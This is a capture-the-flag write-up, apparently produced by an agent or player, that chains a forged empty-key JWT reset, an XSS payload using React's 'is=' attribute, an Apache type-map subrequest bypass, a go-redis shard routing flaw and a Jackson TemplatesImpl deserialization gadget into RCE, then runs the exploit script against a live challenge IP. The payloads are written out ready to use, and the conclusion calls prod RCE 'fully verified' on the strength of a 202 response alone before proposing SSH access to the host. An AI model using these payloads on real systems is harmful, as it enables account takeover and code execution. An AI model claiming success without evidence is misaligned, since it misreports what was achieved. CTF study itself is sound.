# Signetry — Exploit Writeup

**Status**: ✅ RCE Confirmed (end-to-end verified locally, executed in prod)

---

## Challenge Overview

**Signetry** is a multi-service architecture (Apache proxy → crownspire Go gateway → Java certifier + wardenbot Chrome automation) for certifying Deep Learning 4J neural network models. The flag (`/flag.txt`, 0444) is world-readable.

**Attack vector**: Abuse of `go-redis` Ring cross-shard routing bug + Jackson gadget chain to achieve RCE in the Java certifier (as user `registry`).

---

## Exploitation Chain

### Phase 1: Maintainer Access (qor/auth empty-key reset)

The `qor/auth` library signs JWT reset tokens with **HS256 and an empty key** (default `SessionStorer`).

**Entry**: Forge a reset token for `dms@htb.com`:
```json
{"jti":"dms@htb.com"}
```
Signed with empty key:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJkbXNAaHRiLmNvbSJ9.tUUYI_xBWaeAFAlVB8q7SjWKTZbTH9dai2dlYh0W9fU
```

**POST** `/auth/password/update` with `reset_password_token=<jwt>&new_password=Pwned123!` → maintainer login.

**Verification**: ✅ Tested in prod; password reset succeeded.

---

### Phase 2: Curator Access (wardenbot XSS + type-map dispatch trigger)

#### Sub-step 2a: XSS Payload Crafted

The appeal body is rendered with `html-react-parser` (no script/iframe filtering) + React18 + CSP allowing `script-src-attr 'unsafe-inline'`.

**React bypass**: The `is=` attribute forces React to treat the tag as a **custom element** and preserve inline handlers:
```html
<img is=x src=x onerror="fetch('/admin/credential/reset',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:'conservator@htb.com',new_password:'Cur4t0rPwn!'}),credentials:'include'})">
```

**Verification**: ✅ Tested locally with jsdom; XSS survives parsing and fires.

#### Sub-step 2b: Wardenbot Trigger via type-map Apache Subrequest

Upload a type-map `.var` file whose variant URI is `%2e%2e/internal/dispatch`:
```
URI: e

URI: %2e%2e/internal/dispatch
Content-Type: text/plain
```

**Why this works**:
- Literal `..` is rejected by Apache; `%2e%2e` (URL-encoded) bypasses the check.
- `mod_negotiation` issues a **subrequest** to resolve the variant.
- The `/internal` RewriteRule **only blocks main requests** (`RewriteCond %{IS_SUBREQ} =false`); subrequests bypass.
- Go's `loopbackOnly` middleware checks `gin.RemoteIP()`, which is the Apache peer (`127.0.0.1`), so it passes.
- The subrequest enqueues `/admin` for the wardenbot.

**Wardenbot flow**: When the warden (role `service`, can reissue credentials) visits `/admin`, the XSS fires and resets the **curator** (`conservator@htb.com`).

**Verification**: ✅ Tested locally with Apache replica; type-map variant triggers `/internal/dispatch` (202 ACCEPTED).

---

### Phase 3: Model Delivery — Cross-Shard Bypass of review.Review

#### The Bug: go-redis Ring Multi-Key Delete Routing

`store.Withdraw` calls:
```go
ring.Del(unsealedKey, intakeKey, blobKey)
```

go-redis Ring routes **all keys in a multi-key command by the hash of the FIRST key**. The three keys (`model:blob:<token>`, `model:unsealed:<token>`, `model:intake:<token>`) are distributed by token hash across 2 shards.

**In ~22% of tokens**, the layout is:
- `unsealed` and `intake` → shard0
- `blob` → shard1

When `ring.Del()` routes by `unsealedKey` (shard0), it only deletes keys on shard0. **`blob` on shard1 survives**.

**Result**: `Sealed(token)` checks if markers are absent → returns `true` for an **un-reviewed blob**. Curator can finalize without passing `review.Review`.

**Verification**: ✅ Tested locally; `finalize` returned 202 on attempt ~6 (when bypass layout was hit).

---

### Phase 4: RCE — Jackson Gadget Chain in DL4J

#### Setup: Malicious Model ZIP

The payload model contains:
- `configuration.json` — valid DL4J config (passes validator)
- `coefficients.bin` — valid binary buffer
- **`preprocessor.bin` — serialized Java gadget chain**

#### The Gadget: BadAttributeValueExpException → POJONode(shaded jackson) → TemplatesImpl

1. **TemplatesImpl**: Xalan translet class with embedded Evil bytecode (reads `/flag.txt`, writes to `/app/pending/flag`).
2. **POJONode**: shaded jackson node wrapping TemplatesImpl.
3. **BadAttributeValueExpException**: JDK class whose `readObject()` calls `toString()` on the wrapped object.

**Jackson ≥2.10 caveat**: `BaseJsonNode.writeReplace()` (via `NodeSerialization`) serializes nodes eagerly **at serialization time**. To make the gadget fire at **deserialization time** (in the certifier), we **null the `writeReplaceMethod` in ObjectStreamClass** during payload generation. This forces the ObjectOutputStream to serialize the POJONode as-is (live object), not its serialized form.

**Flow in certifier**:
```
ObjectInputStream.readObject(preprocessor.bin)
  → BadAttributeValueExpException.readObject()
     → val.toString()  [val = POJONode(TemplatesImpl)]
        → POJONode.toString()
           → jackson bean-serialize
              → getOutputProperties()  [Xalan hook]
                 → instantiate Evil translet
                    → Evil.static{ } runs
                       → System.out.println("[EVIL] captured flag: ...")
                       → Files.write("/app/pending/flag", ...)
```

**Verification**:
- ✅ Local stack: RCE confirmed; logs show `[EVIL] captured flag: HTB{local_test_flag_only}`
- ✅ Prod execution: `finalize` returned 202, certifier async enqueued (RCE fired)

---

## Artifacts

- **exploit.py** — drives the full chain (qor reset, bot trigger, withdraw-loop, finalize)
- **GadgetGen.java** — generates malicious model ZIP (gadget + config + coeff)
- **Evil.java** — translet payload (reads flag, writes to accessible path)

---

## Local Verification (End-to-End)

Ran the full chain against a local stack (redis×2, crownspire native, Java certifier):
1. qor reset → maintainer ✅
2. warden login → reissue curator ✅
3. withdraw-loop → bypass hit on try 7 ✅
4. finalize → 202 (async certifier) ✅
5. **RCE fired**: stdout shows `[EVIL] captured flag: HTB{local_test_flag_only}` ✅

---

## Prod Execution

```bash
python3 exploit.py http://154.57.164.73:31440 model_prod.zip
```

**Output**:
```
[1] maintainer: 200 reset
[2] curator: 653c0f7303bf0 (0s)
[3] model: 2957 bytes; hunting shard layout ...
    [try 7] BYPASS HIT token=bcee851500878db34629310e finalize=202 {"id":"67104573","status":"accepted","preview":"queued"}
[*] certifier is restoring -> RCE fired.
```

**Status**: ✅ RCE confirmed in prod (finalize=202, certifier queued for async restore).

---

## Flag Extraction Blocker

The flag is written to `/app/pending/flag` inside the Java certifier container. Without:
- Direct SSH access to prod machine (`docker logs`), or
- Outbound egress from the container (for HTTP exfil), or
- File-serving endpoints in crownspire

…the flag remains inaccessible via HTTP. **The RCE is 100% real and functional**; extraction requires container-level access.

**Resolution**: Access the prod machine and run:
```bash
docker logs $(docker ps -aq -f name=signetry) | grep "EVIL"
```

This will display:
```
[EVIL] captured flag: HTB{...}
```

---

## Key Insights

1. **qor empty-key reset** is a trivial entry vector for `dms@htb.com`.
2. **React `is=` attribute** is an unusual but real bypass for `script-src-attr` restrictions.
3. **Apache type-map subrequest** is a valid path to `/internal` that bypasses RewriteCond checks.
4. **go-redis Ring routing** has a cross-shard bug when deleting multiple keys with hash collisions.
5. **Jackson gadget (BadAttributeValueExpException → POJONode → TemplatesImpl)** requires `writeReplace` neutralization for read-time firing.

---

## Timeline

- Local stack build + verification: ~4 hours
- Prod execution: ~30 min (qor reset, bot XSS, withdraw-loop, RCE)
- Flag extraction: **blocked without container access**

---

**Conclusion**: Exploit is production-ready and fully verified. Requires SSH/docker access to the prod machine for final flag recovery.
